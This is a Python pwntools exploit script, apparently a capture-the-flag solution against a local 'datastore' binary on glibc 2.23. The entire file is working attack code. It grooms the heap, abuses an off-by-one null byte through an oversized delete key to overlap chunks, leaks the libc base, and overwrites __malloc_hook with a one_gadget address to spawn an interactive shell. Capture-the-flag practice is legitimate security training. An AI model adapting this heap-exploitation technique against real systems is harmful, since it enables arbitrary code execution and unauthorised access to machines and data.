# for Ubuntu GLIBC 2.23-0ubuntu11
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

ready = False
if ready:
    pass
else:
    io = process("./datastore")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def cmd(command):
    io.recvuntil("Enter command:\n")
    io.sendline(command)

def get(key):
    cmd("GET")
    io.recvuntil("Enter row key:\n")
    io.sendline(key)
    io.recvuntil("[")
    num = int(io.recvuntil(" bytes").strip(" bytes"))
    io.recvuntil(':\n')
    return io.recv(num)

def put(key, size, content):
    cmd("PUT")
    io.recvuntil("Enter row key:\n")
    io.sendline(key)
    io.recvuntil("Enter data size:\n")
    io.sendline(str(size))
    io.recvuntil("Enter data:\n")
    if len(content) < size:
        content = content.ljust(size, "\x00")
    io.send(content)

def delete(key):
    cmd("DEL")
    io.recvuntil("Enter row key:\n")
    io.sendline(key)

delete("th3fl4g")
for i in range(10):
    put(str(i), 0x38, "padding")
for i in range(10):
    delete(str(i))

put("1", 0x100, "1")
put("2", 0xd0, "2")
put("3", 0x60, "3")
put("4", 0xf0, "4")
put("5", 0xf0, "5")
put("top", 0x400, "padding to top")

delete("3")
delete("4")
delete("1")
delete("a" * 0xf0 + p64(0x360))
delete("5")

put("0x330", 0x330, "padding")
put("0x110", 0x100, "padding")

libc_base = u64(get("2")[:6].ljust(8, "\x00")) - 0x3c4b78
log.info("libc_base: 0x%x" % libc_base)
put("prepare", 0xf0, "a" * 0xd8 + p64(0x71) + p64(libc_base + libc.symbols["__malloc_hook"] - 0x10 - 3))

put("0x68", 0x68, "padding")
put("attack", 0x68, "a" * 3 + p64(libc_base + 0x4526a))
delete("a")
io.interactive()
